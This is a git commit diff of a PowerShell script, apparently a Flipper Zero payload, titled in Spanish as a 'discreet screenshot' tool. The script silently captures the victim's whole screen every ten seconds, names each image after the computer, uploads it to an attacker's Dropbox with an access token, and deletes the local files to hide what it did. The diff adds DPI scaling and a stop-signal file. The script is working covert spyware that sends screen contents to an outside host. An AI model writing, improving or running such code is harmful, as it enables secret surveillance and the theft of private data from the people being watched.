be24c99a92f72b82b0594e5471358d1f8c4773aa
flippermen <99625153+dolaraso@users.noreply.github.com>
2024-10-08 12:48:30 -0500

    upd

--- captura de pantalla discreta/captura.ps1
+++ captura de pantalla discreta/captura.ps1
@@ -1,4 +1,32 @@
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+using System.Drawing;
 
+public class DPI {
+  [DllImport("gdi32.dll")]
+  static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+
+  public enum DeviceCap {
+  VERTRES = 10,
+  DESKTOPVERTRES = 117
+  }
+
+  public static float scaling() {
+  Graphics g = Graphics.FromHwnd(IntPtr.Zero);
+  IntPtr desktop = g.GetHdc();
+  int LogicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
+  int PhysicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
+
+  return (float)PhysicalScreenHeight / (float)LogicalScreenHeight;
+  }
+}
+'@ -ReferencedAssemblies 'System.Drawing.dll' -ErrorAction Stop
+
+# Introduce tu token de acceso a continuación.
+$db = "TU_TOKEN_DE_DROPBOX"
+
+# Función para subir archivos a Dropbox
 function Upload-ToDropbox {
     param (
         [string]$filePath,
@@ -27,25 +55,40 @@ function Upload-ToDropbox {
     }
 }
 
+# Archivo de señal para detener el script
+$stopSignalFile = "$env:TEMP\stop.txt"
+
 # Bucle principal para la captura de pantallas
 while ($true) {
+    # Verificar si existe el archivo de señalización para detener el script
+    if (Test-Path $stopSignalFile) {
+        Write-Host "Archivo de señalización detectado. Deteniendo el script."
+        Remove-Item $stopSignalFile -Force
+        exit
+    }
+
     # Obtener información de la pantalla virtual
     $s = [System.Windows.Forms.SystemInformation]::VirtualScreen
 
     # Crear un bitmap del tamaño de la pantalla virtual
-    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width), 0))),([int32]([math]::round($($s.Height), 0)));
+    $b = New-Object System.Drawing.Bitmap ([int32]([math]::round($($s.Width * [DPI]::scaling()), 0))),([int32]([math]::round($($s.Height * [DPI]::scaling()), 0)));
     [System.Drawing.Graphics]::FromImage($b).CopyFromScreen($s.Left, $s.Top, 0, 0, $b.Size)
 
     # Crear un directorio temporal para almacenar el archivo
+    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
+    $userDir = "$env:USERPROFILE\Documents\Screenshots_$folderDateTime"
+    New-Item -Path $userDir -ItemType Directory
+
+    # Guardar el bitmap en PNG
     $fileName = "$env:COMPUTERNAME-$(Get-Date -Format HHmmss).png"
-    $filePath = "$env:TEMP\$fileName"
+    $filePath = "$userDir\$fileName"
     $b.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
 
     # Subir el archivo PNG a Dropbox
     Upload-ToDropbox -filePath $filePath -fileName $fileName -dropboxAccessToken $db
 
     # Limpieza
-    Remove-Item -Path $filePath
+    Remove-Item -Path $userDir -Recurse
 
     # Esperar 10 segundos antes de la siguiente iteración
     Start-Sleep -Seconds 10
